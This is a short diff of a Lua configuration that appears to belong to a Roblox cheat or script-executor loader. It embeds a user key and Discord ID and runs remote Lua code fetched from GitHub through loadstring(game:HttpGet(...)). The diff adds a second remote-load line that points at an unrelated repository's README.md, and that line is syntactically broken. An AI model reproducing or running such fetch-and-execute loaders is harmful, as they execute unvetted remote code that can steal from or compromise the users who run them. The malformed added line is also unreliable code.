@@ -31,7 +31,7 @@ _G["External Config"] = {
     _G.Key = "%s"
     _G.DiscordId = "%s"
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Natsuhanaki/Royx_PC/main/loader.lua"))()
-    loadstring(
+    loadstring(https://raw.githubusercontent.com/toohot123/Roblox1/main/README.md"))()
 ]], Key, DiscordId))
 
 -- loadstring(game:HttpGet("https://raw.githubusercontent.com/Natsuhanaki/Royx_PC/main/loader.lua"))()
